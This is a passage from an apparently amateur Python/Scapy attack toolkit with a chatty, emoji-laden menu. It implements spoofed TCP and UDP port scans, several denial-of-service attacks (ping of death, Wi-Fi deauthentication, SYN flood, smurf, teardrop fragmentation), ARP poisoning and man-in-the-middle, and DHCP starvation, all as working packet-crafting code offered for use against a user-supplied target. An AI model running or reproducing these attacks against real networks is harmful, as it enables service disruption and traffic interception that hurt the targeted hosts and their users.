                                for infoo2 in tcp_attack[1]:
                                    info_ip2=infoo2[0]
                                    print(info_ip2.show())
                                print("Sorry maam no host found....🥺") 
                          else:
                              searching_text2="▄︻┻═┳一 ﮩ٨ـﮩﮩ٨ـᏕc𝘢𝑛𝕟ℹ𝓃𝕘ﮩ٨ـﮩﮩ٨ـ"
                              for d in searching_text2:
                                 print(d,end="",flush=True)
                                 s(0.1)
                              print("")
                              if num_of_layer==3:
                                 tcp_attack=sr(IP(src=saddr,dst=target_ip_addr)/TCP(dport=target_port,flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                              else:
                                 tcp_attack=srp(Ether()/IP(src=saddr,dst=target_ip_addr)/TCP(dport=target_port,flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                              def tcp_scan_report():
                                  if tcp_attack[0]:
                                     tcp_ports=[]
                                     port_names=[]
                                     tcp_flag=[]
                                     tcp_status=[]
                                     tcp_checksum=[]
                                     ip_checksum=[]
                                     for s,r in tcp_attack[0]:
                                         if r[TCP].flags=="SA":
                                            tcp_status.append("Open(👹)")
                                         elif r[TCP].flags=="RA":
                                             tcp_status.append("Close(😟)")
                                         elif r[TCP].flags=="R":
                                              tcp_status.append("Probability of Exploitation(😈)")
                                         else:
                                            tcp_status.append("No-Connection(👾)")
                                     for s,r in tcp_attack[0]:
                                         tcp_ports.append(r[TCP].sport)
                                         tcp_flag.append(r[TCP].flags)
                                         tcp_checksum.append(r.sprintf("%TCP.chksum%"))
                                         ip_checksum.append(r.sprintf("%IP.chksum%"))
                                         port_names.append(r.sprintf("%TCP.sport%"))
                                     return tcp_ports,port_names,ip_checksum,tcp_checksum,tcp_flag,tcp_status
                                  else:
                                    pass
                              if bool(tcp_attack[0])==True:
                                 tcp_report=tcp_scan_report()
                                 tcp_report_table=tabular()
                                 tcp_report_table.title=f"🔍 Network Reconnaissance Report for {target_ip_addr} 🔎"
                                 tcp_report_table.field_names=['Port','Port Name','IP CheckSum','TCP CheckSum','Flag','Status Check']
                                 for i,j,k,l,m,n in zip(tcp_report[0],tcp_report[1],tcp_report[2],tcp_report[3],tcp_report[4],tcp_report[5]):
                                     tcp_report_table.add_row([i,j,k,l,m,n])
                                 print(tcp_report_table)
                                 info_port=input("Maam do you want to need more information[y/n]:- ")
                                 if info_port=='y':
                                    for infoo in tcp_attack[0]:
                                        info_ip=infoo[1][0]
                                        print(info_ip.show())
                                    print("Byee Byee maam..( ´◡  ‿ ゝ ◡` )")
                                 else:
                                     print("🤗....🤗")
                              else:
                                 for infoo2 in tcp_attack[1]:
                                     info_ip2=infoo2[0]
                                     print(info_ip2.show())
                                 print("Sorry maam no host found....🥺")    
                        source_addr=input("Maam do you want to give other ip address then type that ip or leave it blank if you give then most of the time it won't give any answer ( ｡ •́ ︿ •̀ ｡ ):- ")         
                        if bool(source_addr)==True:
                           tcp_scanning(flagset,source_addr)
                        else:
                            tcp_scanning(flagset)                    
              else:
                  D.udp_scanner()
                  print("")
                  udp_d = """                                        
                     /   ))     |\         )               ).           
               c--. (\  ( `.    / )  (\   ( `.     ).     ( (           
               | |   ))  ) )   ( (   `.`.  ) )    ( (      ) )          
               | |  ( ( / _..----.._  ) | ( ( _..----.._  ( (           
 ,-.           | |---) V.'-------.. `-. )-/.-' ..------ `--) \._        
 | /===========| |  (   |      ) ( ``-.`\/'.-''           (   ) ``-._   
 | | / / / / / | |--------------------->  <-------------------------_>=-
 | \===========| |                 ..-'./\.`-..                _,,-'    
 `-'           | |-------._------''_.-'----`-._``------_.-----'         
               | |         ``----''            ``----''                  
               | |                                                       
               c--`                                                   

"""
                  print(colored(udp_d,"yellow",attrs=['bold']))
                  udp_s_port_str=input("Maam do you have any wish to give your Source port then type just port number or simply you can leave it( ◠ ‿ ・ )—☆ :- ")
                  udp_d_port=int(input("Maam please give the target port ( ✯ ᴗ ✯ ):- "))
                  query=input("You can also set the query name of dns ex('www.example.com') or you can use your custom data like('hii maam') ( ｡ •̀ ᴗ - )✧:- ")
                  if bool(udp_s_port_str)==True:
                     udp_s_int=int(udp_s_port_str)
                     udp_wish=input("Do you wanna find multiple ports[y/n]:- ")
                     if udp_wish=='y':
                        udp_d_port_2=int(input("Maam give the 2nd port number it will be bigger number than the previous port number:- "))
                        udp_attack_themes1="▄︻┻═┳一ཧᜰ꙰ꦿ➢••••°Ｇค𝒾ꫛ𝒾ꫛɠ Ｖ¡cţ¡𝙢ₛ ῖꫛ𝒇ŏ°•"
                        for x in udp_attack_themes1:
                            print(x,end="",flush=True)
                            s(0.1)
                        print("")    
                        if num_of_layer==3: 
                           udp_attack=sr(IP(src=my_ip,dst=target_ip_addr)/UDP(sport=udp_s_int,dport=(udp_d_port,udp_d_port_2))/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        else:
                            udp_attack=srp(Ether()/IP(src=my_ip,dst=target_ip_addr)/UDP(sport=udp_s_int,dport=(udp_d_port,udp_d_port_2))/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        def udp_scan_report():
                            udp_ports=[]
                            udp_ports_names=[]
                            ip_checksum=[]
                            udp_icmp_checksum=[]
                            dns_query=[]
                            udp_status=[]
                            for s,r in udp_attack[0]:
                                if r[IP].proto==1:
                                    udp_ports.append(r[UDPerror].dport)
                                    udp_ports_names.append(r.sprintf("%UDPerror.dport%"))
                                    ip_checksum.append(r.sprintf("%IP.chksum%"))
                                    udp_icmp_checksum.append(r.sprintf("%ICMP.chksum%(icmp)"))
                                    dns_query.append("No-Reply")
                                    udp_status.append("Close(😒)")
                                elif r[IP].proto==17:
                                      udp_ports.append(r[UDP].sport)
                                      udp_ports_names.append(r.sprintf("%UDP.sport%"))
                                      ip_checksum.append(r.sprintf("%IP.chksum%"))
                                      udp_icmp_checksum.append(r.sprintf("%UDP.chksum%(udp)"))
                                      udp_status.append("Open(😈)")
                                      for t in r[DNS].qd:
                                          dns_query.append(t.qname.decode())
                            return udp_ports,udp_ports_names,ip_checksum,udp_icmp_checksum,dns_query,udp_status
                        if udp_attack[0]:
                           udp_report_table=tabular()
                           udp_report=udp_scan_report()
                           udp_report_table.title=f"👁️ Security Assessment Report for {target_ip_addr} 👁️"
                           udp_report_table.field_names=['Serial No.','Ports','Port Names','IP CheckSum','UDP/ICMP CheckSum','Query','Status Check']
                           a=0
                           for i,j,k,l,m,n in zip(udp_report[0],udp_report[1],udp_report[2],udp_report[3],udp_report[4],udp_report[5]):
                               a+=1
                               udp_report_table.add_row([a,i,j,k,l,m,n])
                           print(udp_report_table)
                           mul=input("Do you want to know more about this[y/n]:- ")
                           if mul=='y':
                              for udp_mul in udp_attack[0]:
                                  print(udp_mul[1][0].show())
                              udp_save=input("Do you want to save it in a file maam( ✿ ^ ‿ ^ ) [y/n]:- ")
                              if udp_save=='y':
                                 udp_mul_s=input("Maam plz set the file name that you want to save it ( ◜ ‿ ◝ )♡ :- ")
                                 udp_mul_save=directory+udp_mul_s+".txt"
                                 with open(udp_mul_save,"w") as u:
                                      for g in udp_attack[0]:
                                          u.write(str(g[1]))
                                          u.write("\n")
                                 bar=progressbar.ProgressBar(maxval=100,widgets=["༺☆૮𝚛êⲁₜ𝕚ƞ𝘨☆༻",progressbar.Bar(marker="#",left=' [',right=']'),progressbar.FileTransferSpeed(),' (',progressbar.ETA(),') ']).start()
                                 for i in range(100):
                                     bar.update(i)
                                     s(0.1)
                                 print("")
                                 print(f"Your file save is:- {udp_mul_save}")
                                 system(f"dbus-launch gnome-terminal -q --command 'nano {udp_mul_save}'")
                                 print("Thank you maam for save it beacuse it will help you for future analysis...( ◡  ω ◡ )")
                              else:
                                 print("Okk Maam as your wish...( ◜ ‿ ◝ )♡")
                           else:
                               print("Tatatata......🤭")
                        else:
                           for udp_mul in udp_attack[0]:
                               print(udp_mul[0].show())
                           print("Sorry maam No host found or it is not respond me....(´. .̫ .`) ")
                     else:
                        udp_attack_themes2="(ง ͠ ᵒ̌ Дᵒ̌)¤=[]:::::>乂✰ﾑττᤂc𝙠✰乂"
                        for x in udp_attack_themes2:
                            print(x,end="",flush=True)
                            s(0.1)
                        print("")
                        if num_of_layer==3:
                           udp_attack=sr(IP(src=my_ip,dst=target_ip_addr)/UDP(sport=udp_s_int,dport=udp_d_port)/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        else:
                            udp_attack=srp(Ether()/IP(src=my_ip,dst=target_ip_addr)/UDP(sport=udp_s_int,dport=udp_d_port)/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        def udp_scan_report():
                            udp_ports=[]
                            udp_ports_names=[]
                            ip_checksum=[]
                            udp_icmp_checksum=[]
                            dns_query=[]
                            udp_status=[]
                            for s,r in udp_attack[0]:
                                if r[IP].proto==1:
                                    udp_ports.append(r[UDPerror].dport)
                                    udp_ports_names.append(r.sprintf("%UDPerror.dport%"))
                                    ip_checksum.append(r.sprintf("%IP.chksum%"))
                                    udp_icmp_checksum.append(r.sprintf("%ICMP.chksum%(icmp)"))
                                    dns_query.append("No-Reply")
                                    udp_status.append("Close(😒)")
                                elif r[IP].proto==17:
                                      udp_ports.append(r[UDP].sport)
                                      udp_ports_names.append(r.sprintf("%UDP.sport%"))
                                      ip_checksum.append(r.sprintf("%IP.chksum%"))
                                      udp_icmp_checksum.append(r.sprintf("%UDP.chksum%(udp)"))
                                      udp_status.append("Open(😈)")
                                      for t in r[DNS].qd:
                                          dns_query.append(t.qname.decode())
                            return udp_ports,udp_ports_names,ip_checksum,udp_icmp_checksum,dns_query,udp_status
                        if udp_attack[0]:
                           udp_report_table=tabular()
                           udp_report=udp_scan_report()
                           udp_report_table.title=f"🎃 Vulnerability Assessment Report for {target_ip_addr} 🎃"
                           udp_report_table.field_names=['Ports','Port Names','IP CheckSum','UDP/ICMP CheckSum','Query','Status Check']
                           for i,j,k,l,m,n in zip(udp_report[0],udp_report[1],udp_report[2],udp_report[3],udp_report[4],udp_report[5]):
                               udp_report_table.add_row([i,j,k,l,m,n])
                           print(udp_report_table)
                           mul=input("Do you want to know more about this[y/n]:- ")
                           if mul=='y':
                              for udp_mul in udp_attack[0]:
                                  print(udp_mul[1][0].show())
                              print("Seee youu...😋")
                           else:
                              print("Okk Maam Have a nice day...🥰")
                        else:
                            print("Sorry Maam I didn't find the host...ʕ´•ᴥ•̥`ʔ")
                  else:
                     udp_wish=input("Do you wanna find multiple ports[y/n]:- ")
                     if udp_wish=='y':
                        udp_d_port_2=int(input("Maam give the 2nd port number it will be bigger number than the previous port number:- "))
                        udp_attack_themes3="( う-´)づ︻╦̵̵̿╤──• • •☠•.Ꮢⲗị𝗱ˢ ٥𐌽 Ѷịc𝓽𝒾ṁ.•☠•"
                        for x in udp_attack_themes3:
                            print(x,end="",flush=True)
                            s(0.1)
                        print("")
                        if num_of_layer==3:
                           udp_attack=sr(IP(src=my_ip,dst=target_ip_addr)/UDP(dport=(udp_d_port,udp_d_port_2))/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        else:
                             udp_attack=srp(Ether()/IP(src=my_ip,dst=target_ip_addr)/UDP(dport=(udp_d_port,udp_d_port_2))/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        def udp_scan_report():
                            udp_ports=[]
                            udp_ports_names=[]
                            ip_checksum=[]
                            udp_icmp_checksum=[]
                            dns_query=[]
                            udp_status=[]
                            for s,r in udp_attack[0]:
                                if r[IP].proto==1:
                                    udp_ports.append(r[UDPerror].dport)
                                    udp_ports_names.append(r.sprintf("%UDPerror.dport%"))
                                    ip_checksum.append(r.sprintf("%IP.chksum%"))
                                    udp_icmp_checksum.append(r.sprintf("%ICMP.chksum%(icmp)"))
                                    dns_query.append("No-Reply")
                                    udp_status.append("Close(😒)")
                                elif r[IP].proto==17:
                                      udp_ports.append(r[UDP].sport)
                                      udp_ports_names.append(r.sprintf("%UDP.sport%"))
                                      ip_checksum.append(r.sprintf("%IP.chksum%"))
                                      udp_icmp_checksum.append(r.sprintf("%UDP.chksum%(udp)"))
                                      udp_status.append("Open(😈)")
                                      for t in r[DNS].qd:
                                          dns_query.append(t.qname.decode())
                            return udp_ports,udp_ports_names,ip_checksum,udp_icmp_checksum,dns_query,udp_status
                        if udp_attack[0]:
                           udp_report_table=tabular()
                           udp_report=udp_scan_report()
                           udp_report_table.title=f"👁️ Security Assessment Report for {target_ip_addr} 👁️"
                           udp_report_table.field_names=['Serial No.','Ports','Port Names','IP CheckSum','UDP/ICMP CheckSum','Query','Status Check']
                           a=0
                           for i,j,k,l,m,n in zip(udp_report[0],udp_report[1],udp_report[2],udp_report[3],udp_report[4],udp_report[5]):
                               a+=1
                               udp_report_table.add_row([a,i,j,k,l,m,n])
                           print(udp_report_table)
                           mul=input("Do you want to know more about this[y/n]:- ")
                           if mul=='y':
                              for udp_mul in udp_attack[0]:
                                  print(udp_mul[1][0].show())
                              udp_save=input("Do you want to save it in a file maam(✿ ^ ‿ ^ ) [y/n]:- ")
                              if udp_save=='y':
                                 udp_mul_s=input("Maam plz set the file name that you want to save it ( ◍ • ᴗ • ◍ ) ❤ :- ")
                                 udp_mul_save=directory+udp_mul_s+".txt"
                                 with open(udp_mul_save,"w") as u:
                                      for g in udp_attack[0]:
                                          u.write(str(g[1]))
                                          u.write("\n")
                                 bar=progressbar.ProgressBar(maxval=100,widgets=["༺  ♦ ⪼ Ꮋǻ𝙩cᏥịꪦℊ ⪻ ♦༻  ",progressbar.Bar(marker="#",left=' [',right=']'),progressbar.FileTransferSpeed(),' (',progressbar.ETA(),') ']).start()
                                 for i in range(100):
                                     bar.update(i)
                                     s(0.1)
                                 print("")
                                 print(f"Your file save is:- {udp_mul_save}")
                                 system(f"dbus-launch gnome-terminal -q --command 'nano {udp_mul_save}'")
                                 print("Thank you maam for save it beacuse it will help you for future analysis...( ◡ ω ◡ )")
                              else:
                                 print("Okk Maam as your wish...( ◜ ‿ ◝ )♡")
                           else:
                              print("Okk Maam....( ◠ ‿ ◕ ")      
                        else:
                           for udp_mul in udp_attack[0]:
                               print(udp_mul[0].show())
                           print("Sorry maam No host found or it is not respond me....(´. .̫ .`) ")
                     else:
                        udp_attack_themes4="(-_･) ▄︻̷̿┻̿═━一 ▸ - - - - - ☠"
                        for x in udp_attack_themes4:
                            print(x,end="",flush=True)
                            s(0.2)
                        print("")
                        if num_of_layer==3:
                           udp_attack=sr(IP(src=my_ip,dst=target_ip_addr)/UDP(dport=udp_d_port)/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        else:
                            udp_attack=srp(Ether()/IP(src=my_ip,dst=target_ip_addr)/UDP(dport=udp_d_port)/DNS(qd=DNSQR(qname=query)),timeout=5,verbose=False,iface=interface_val)
                        def udp_scan_report():
                            udp_ports=[]
                            udp_ports_names=[]
                            ip_checksum=[]
                            udp_icmp_checksum=[]
                            dns_query=[]
                            udp_status=[]
                            for s,r in udp_attack[0]:
                                if r[IP].proto==1:
                                    udp_ports.append(r[UDPerror].dport)
                                    udp_ports_names.append(r.sprintf("%UDPerror.dport%"))
                                    ip_checksum.append(r.sprintf("%IP.chksum%"))
                                    udp_icmp_checksum.append(r.sprintf("%ICMP.chksum%(icmp)"))
                                    dns_query.append("No-Reply")
                                    udp_status.append("Close(😒)")
                                elif r[IP].proto==17:
                                      udp_ports.append(r[UDP].sport)
                                      udp_ports_names.append(r.sprintf("%UDP.sport%"))
                                      ip_checksum.append(r.sprintf("%IP.chksum%"))
                                      udp_icmp_checksum.append(r.sprintf("%UDP.chksum%(udp)"))
                                      udp_status.append("Open(😈)")
                                      for t in r[DNS].qd:
                                          dns_query.append(t.qname.decode())
                            return udp_ports,udp_ports_names,ip_checksum,udp_icmp_checksum,dns_query,udp_status
                        if udp_attack[0]:
                           udp_report_table=tabular()
                           udp_report=udp_scan_report()
                           udp_report_table.title=f"🎃 Vulnerability Assessment Report for {target_ip_addr} 🎃"
                           udp_report_table.field_names=['Ports','Port Names','IP CheckSum','UDP/ICMP CheckSum','Query','Status Check']
                           for i,j,k,l,m,n in zip(udp_report[0],udp_report[1],udp_report[2],udp_report[3],udp_report[4],udp_report[5]):
                               udp_report_table.add_row([i,j,k,l,m,n])
                           print(udp_report_table)
                           mul=input("Do you want to know more about this[y/n]:- ")
                           if mul=='y':
                              for udp_mul in udp_attack[0]:
                                  print(udp_mul[1][0].show())
                              print("Seee youu...😋")
                           else:
                              print("Okk Maam Have a nice day...🥰")
                        else:
                            print("Sorry Maam I didn't find the host...ʕ´•ᴥ•̥`ʔ")
        elif value==4:
             D.dos_design()
             print("")
             warn_text="""
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             //                                                                                                                          //
             //      :::       :::           :::        :::::::::       ::::    :::       :::::::::::       ::::    :::       ::::::::   //
             //     :+:       :+:         :+: :+:      :+:    :+:      :+:+:   :+:           :+:           :+:+:   :+:      :+:    :+:   //
             //    +:+       +:+        +:+   +:+     +:+    +:+      :+:+:+  +:+           +:+           :+:+:+  +:+      +:+           //
             //   +#+  +:+  +#+       +#++:++#++:    +#++:++#:       +#+ +:+ +#+           +#+           +#+ +:+ +#+      :#:            //
             //  +#+ +#+#+ +#+       +#+     +#+    +#+    +#+      +#+  +#+#+#           +#+           +#+  +#+#+#      +#+   +#+#      //
             //  #+#+# #+#+#        #+#     #+#    #+#    #+#      #+#   #+#+#           #+#           #+#   #+#+#      #+#    #+#       //
             //  ###   ###         ###     ###    ###    ###      ###    ####       ###########       ###    ####       ########         //
             //                                                                                                                          //
             //                                                                                                                          //
             //                           Maam You are in Dos Attack So please use your External wifi dongle                             //
             //                           if you use your internal wifi or nic card to create a dos attack                               //
             //                                then i don't know it may damage your internal wifi                                        //                     
             //                                                                                                                          //
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             """
             warn_color=colored(warn_text,'red',attrs=['bold'])
             print(warn_color)
             interface_name=input("Maam please give your external interface name(recomended) or simply you can leave it 😉:- ")
             external_ip=my_ip
             if bool(interface_name)==True:
                external_ip=get_if_addr(interface_name) 
                print("Maam Your External wifi's ip is ( * ˘ ︶ ˘ * ). ｡ * ♡:- ",external_ip)
             target_address=input("Maam give the Target Address that you want to attack ⨶‿⨶ :- ")    
             D.attack_method_table()
             attack_method=int(input("Now Choose the Attack Mode of Dos Attack ಠ‿↼ :- "))
             if attack_method==1:
                D.pod_design()
                print("")
                message=input("Maam what's your message 乂❤‿❤乂 :- ")
                pkt_sent=int(input("Give the packet Number that you want to send the packets 🤪:- "))
                methodd=int(input("Maam it has also two methods which Method do you want to choose 1 msg will go as string and 2 msg will go as a character:- "))
                if methodd==1:
                    i=0
                    while (i<len(message)):
                          i+=1
                    ping_of_death=IP(src=external_ip,dst=target_address)/ICMP()/(message*(int(65505/i)))
                    pod_banner="( つ•̀ω•́)つ・・*:・:・゜:==≡≡Σ=͟͟͞͞(✡)`Д´）"
                    for pod in pod_banner:
                        print(pod,end="",flush=True)
                        s(0.1)
                    print("")
                    if bool(interface_name)==True:
                       send(ping_of_death*pkt_sent,iface=interface_name)
                    else:
                       send(ping_of_death*pkt_sent) 
                else:
                    buffer_size=int(input("you are choosing this method so you have to give the buffer size remember it won't be more than 65505:- "))
                    pod_banner2="－－－＝＝＝＝*~●ﾍ(ﾟρﾟ)ﾉ~"
                    for pod in pod_banner2:
                        print(pod,end="",flush=True)
                        s(0.1)
                    print("")
                    for j in message:
                        ping_of_death=IP(src=external_ip,dst=target_address)/ICMP()/(j*buffer_size)
                        if bool(interface_name)==True:
                           send(ping_of_death*pkt_sent,iface=interface_name)
                        else:
                           send(ping_of_death*pkt_sent)
             elif attack_method==2:
                  D.deauhentinticaton_design()
                  print("")
                  target_mac=input("Maam give the target Mac Address..( ͡ᵔ ͜ʖ ͡ᵔ )")
                  gateway_mac=input("Give the gateway mac address ⊂◉‿◉つ:- ")
                  monitor_mode=input("Maam in this attack 1st you have to enable the monitor mode so have you enabled[y/n]???:- ")
                  if monitor_mode=='y':
                     pass
                  else:
                    print("Anyway Don't Worry Ma'am i am working on it...")
                    system(f"ifconfig {interface_name} down")
                    system(f"iwconfig {interface_name} mode monitor")
                    system(f"ifconfig {interface_name} up")           
                    s(0.05)
                    print("Now check the interface...")
                  interface_monitor=input("Please give the interface name which is already in monitor mode:- ")
                  counting_num=int(input("Give the Counter Numbers:- "))
                  deauthh=Dot11(addr1=target_mac,addr2=gateway_mac,addr3=gateway_mac)
                  deauth_pkt=RadioTap()/deauthh/Dot11Deauth(reason=7)
                  scan_attack_theme="( φ_<)r︻╦╤─ - - - 🗯"
                  for theme in scan_attack_theme:
                      print(theme,end="",flush=True)
                      s(0.1)
                  print("")
                  sendp(deauth_pkt,counter=counting_num,inter=0.1,iface=interface_monitor)
             elif attack_method==3:
                  D.synflood_design()
                  print("")
                  def set_values():
                      set_ttl=int(input("Maam Set the Time to Live value by the numbers for an ip ꒰ღ˘‿˘ற꒱❤⃛:- "))
                      port_range1=input("Maam set the 1st Port (-‿◦☀):- ")
                      port_range2=input("Maam set the 2nd Port (◑‿◐):- ")
                      set_ack=int(input("Set the Acknowledge value by enter number -(๑☆‿ ☆#)ᕗ:- "))
                      print("I know Maam this is very weird but trust meee maam it will give you a better understanding about how syn flood attacks are occured...｡^‿^｡")
                      size_pwindow=int(input("Please Set a size of window remember not more than 65535 (͡o‿O͡):- "))
                      message_value=input("Maam do you have a meassage that you want to send...or simply you can leave it (>‿♥) :- ")
                      counting_num=int(input("Set the Counters:- "))
                      time_interval=input("Even Maam You have to set the time interval also ˉ̞̭⋆›◡‹˄̻̊ :- ")
                      synflood=IP(dst=target_address,ttl=set_ttl)/TCP(sport=RandShort(),dport=range(int(port_range1),int(port_range2)+1),ack=set_ack,window=size_pwindow)/message_value
                      ls(synflood)
                      print("Counters   :",counting_num,"\nInterval   :",time_interval)
                      confirma=input("Is it okk maam..?????[y/n]:- ")
                      if confirma=='y':
                         if bool(interface_name)==True:
                            attack_theme1="(ノ#-◇-)ノ ~~~~┻━┻☆(x _ x)ノ"
                            for x in attack_theme1:
                                print(x,end="",flush=True)
                                s(0.2)
                            print("")
                            syn_result=srloop(synflood,count=counting_num,inter=float(time_interval),iface=interface_name,verbose=False)
                            if syn_result[0]:
                               syn_result[0].summary(lambda s,r:r.sprintf("%IP.src%\t%TCP.sport%\t%TCP.flags%"))
                            else:
                                print("I think Maam Host is down or it doesn't reply mee...")
                         else:
                            attack_theme2="!!( ・_・)r鹵~<炎炎炎炎炎炎(ﾟ■ﾟ;;)ﾉ"
                            for x in attack_theme2:
                                print(x,end="",flush=True)
                                s(0.2)
                            print("")
                            syn_result=srloop(synflood,count=counting_num,inter=float(time_interval),verbose=False)
                            if syn_result[0]:
                               syn_result[0].summary(lambda s,r:r.sprintf("%IP.src%\t%TCP.sport%\t%TCP.flags%"))
                            else:
                                print("I think Maam Host is down or it doesn't reply mee...")                 
                      else:
                         set_values()  
                  set_values()
             elif attack_method==4:
                  D.smurf_design()
                  print("")
                  smurf_method=input("Maam in this Attack it has also 2 methods in Method 1 you can set only 1 target but in Method you can set 2 targets so which one u do prefer (-‿◦):- ")
                  num=int(input("Maam Please give Numbers of Packets that you want to send（♥￫ｏ￩♥）:- "))
                  if smurf_method=='1':
                    attack_theme3="ヽ( ﾟｰﾟ)ﾉ}　　　–→　｡｡｡｡;;ﾉ>_<)ﾉ"
                    for x in attack_theme3:
                        print(x,end="",flush=True)
                        s(0.2)
                    print("")
                    if bool(interface_name)==True:
                        send(IP(src=target_address,dst=external_ip)/ICMP(),iface=interface_name,count=num)
                    else:
                        send(IP(src=target_address,dst=external_ip)/ICMP(),count=num)
                  else:
                    target_ip2=input("Maam Give the another target ip ⧽(•‿•)⧼ :- ")
                    attack_theme4="(҂`_´) ,︻╦̵̵̿╤─ ҉ - -- -- -- ꒒ ০ ⌵ ୧ ♡"
                    for x in attack_theme4:
                        print(x,end="",flush=True)
                        s(0.2)
                    print("")
                    if bool(interface_name)==True:
                        send(IP(src=target_address,dst=target_ip2)/ICMP(),iface=interface_name,count=num)
                    else:
                        send(IP(src=target_address,dst=target_ip2)/ICMP(),count=num)
             else:
                D.teardrop_design()
                print("")
                size=int(input("Maam Give the Packet Size ( ♥ ͜ʖ ♥) :- "))
                load=input("Maam put your Message or a letter ✿♥‿♥✿ :- ")  
                set_offset=int(input("Maam Set the Offset Number (─‿‿─) ♡:- "))
                numm=int(input("Set The Number of packets that you want to send ( ๑˘ω˘ ):- ")) 
                offset_method=input("You can set the offset by 2 methods in Method 1 only you can puth the offset number but in Method 2 Your Offset would be Incremented So Type 1 or 2 (＊๑˘◡˘):- ") 
                if offset_method=='1':
                    attack_theme5="( ͡🌀 ͜ʖ ͡🌀)つ━━━☆ﾟ.*･｡ﾟ 𝘔ꪖ𝙜𝘪c*॰¨̮ ♡➳♡¯ツ"
                    for x in attack_theme5:
                        print(x,end="",flush=True)
                        s(0.2)
                    print("")
                    send(IP(dst=target_address,flags='MF',frag=set_offset,proto=17)/load*size,iface=interface_name,count=numm)if bool(interface_name)==True else send(IP(dst=target_address,flags='MF',frag=set_offset,proto=17)/load*size,count=numm)
                else:
                    ran1=int(input("Enter the 1st Range ԅ (≖◡≖ԅ):- "))
                    ran2=int(input("Maam Enter the 2nd Range ✌.|•͡˘‿•͡˘|.✌:- "))
                    i=0
                    attack_theme6=" ─=≡Σ(((⊏ ͠°ʖ̯ ͠°)⊐o()xx[{::::::::> 𝓑ꪊ𝕣ᔆ𝕥 ℳо𝕕𝐞"
                    for x in attack_theme6:
                        print(x,end="",flush=True)
                        s(0.2)
                    print("")
                    while i<size:       
                        while ran1<=ran2:
                              print(f"X------------{set_offset}------------X")
                              j=0
                              while j<size:
                                    send(IP(dst=target_address,flags='MF',frag=set_offset,proto=17)/load*size,iface=interface_name,count=numm)if bool(interface_name)==True else send(IP(dst=target_address,flags='MF',frag=set_offset,proto=17)/load*size,count=numm)
                                    j+=1
                              set_offset=set_offset+1
                              ran1+=1
                        i+=1                      
                print("Okkk Byee Noww Maaam....🫣")
        elif value==5:
            D.snif_design()
            print("")
            bug_text="""
           .       .                   .       .      .     .      .
          .    .         .    .            .     ______
      .           .             .               ////////
                .    .   ________   .  .      /////////     .    .
           .            |.____.  /\        ./////////    .
    .                 .//      \/  |\     /////////
       .       .    .//          \ |  \ /////////       .     .   .
                    ||.    .    .| |  ///////// .     .
     .    .         ||           | |//`,/////                .
             .       \\\\        ./ //  /  \/   .
  .                    \\\\.___./ //\` '   ,_\     .     .
          .           .     \ //////\ , /   \                 .    .
                       .    ///////// \|  '  |    .
      .        .          ///////// .   \ _ /          .
                        /////////                              .
                 .   ./////////     .     .
         .           --------   .                  ..             .
  .               .        .         .                       .
                        ________________________
____________------------                        -------------_________                                                                                                            
               """
            print(colored(bug_text,"cyan",attrs=['bold']))
            print("")
            D.sniffing_mode() 
            attack_mode_value=int(input("Maaam Choose the Attack Mode ( ͡^ ͜ʖ ͡^ ):- "))
            if attack_mode_value==1:
                D.active_mode()
                print("")
                D.sniffing_active_table()
                active_sniffer=int(input("Maam Choose the Active attack Mode ( ◥◣_◢◤ ) :- "))
                if active_sniffer==1:
                   D.arp_poison_design()
                   print("")
                   target_mac=input("Maam Please the target Mac Address or leave it :- ")
                   gateway_ip=input("You have to give the gateway ip :- ")
                   target_addresss=input("Maam give the target Address :- ")
                   if bool(target_mac)==True:
                      val1=int(input("Okk Maaam Set the Interval 1st Range :- "))
                      val2=int(input("Set the 2nd Range :- "))
                      themes1="(۶ૈ ᵒ̌ Дᵒ̌)۶ૈ=͟͟͞͞ ⌨"
                      for x in themes1:
                         print(x,end="",flush=True)
                         s(0.2)
                      print("")
                      sendp(Ether(dst=target_mac)/ARP(op="who-has",psrc=gateway_ip,pdst=target_addresss),inter=RandNum(val1,val2))
                   else:
                      themes2="( つ•̀ω•́)つ・・*:・:・゜:==≡≡Σ=͟͟͞͞(✡)`Д´"
                      for x in themes2:
                         print(x,end="",flush=True)
                         s(0.2)
                      print("")
                      arp_mitm(gateway_ip,target_addresss)
                else:
                    D.dhcp_star_design()
                    print("")
                    gateway_ips=input("Maam Please give your Gateway Ip ° ͜ʖ ͡ – ✧ :- ")
                    num_of_pkts=int(input("Maam Please give the number that you want to send the packets ƪ(˘⌣˘)ʃ :- "))
                    interface_name=input("Give your Ethernet interface name ( ✧≖ ͜ʖ≖) :- ")
                    packets=Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff",type=0x0800)/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(op=1,chaddr=RandMAC())/DHCP(options=[("message-type","request"),("server_id",gateway_ips),("end")])
                    themes5="(╯°□°)--︻╦╤─ - - -"
                    for x in themes5:
                        print(x,end="",flush=True)
                        s(0.2) 
                    sendp(packets,iface=interface_name,count=num_of_pkts)    
            else:
                 D.passive_mode()
                 print("")
                 D.sniffing_passive_table()
                 snif_mode=int(input("Maam Chosse The Mode (ﾐゝᆽ ☆ ﾟﾐ):- "))
                 if snif_mode==2:
                    D.sniffing_sniffer_table()
                    analyzer_mode_value=int(input("Maam Which Mode you wanna prefer ꒰ · ◡ · ꒱ :- "))
                    if analyzer_mode_value==1:
                       D.sniffer_design(sniffer_name="𝐴℟ℙ")
                       print("")
                       def arp_callback(pkt):
                           if ARP in pkt and pkt[ARP].op==1:
                              print(pkt.sprintf("%ARP.hwdst% Where are you baby...🥺 %ARP.pdst%? Tell %ARP.hwsrc% %ARP.psrc%"))
                           elif pkt[ARP].op==2 and not pkt[ARP].hwdst=="00:00:00:00:00:00:00":
                                return pkt.sprintf("%ARP.psrc% I am Here Honey...😘 %ARP.hwsrc%")    
                       store_num=0
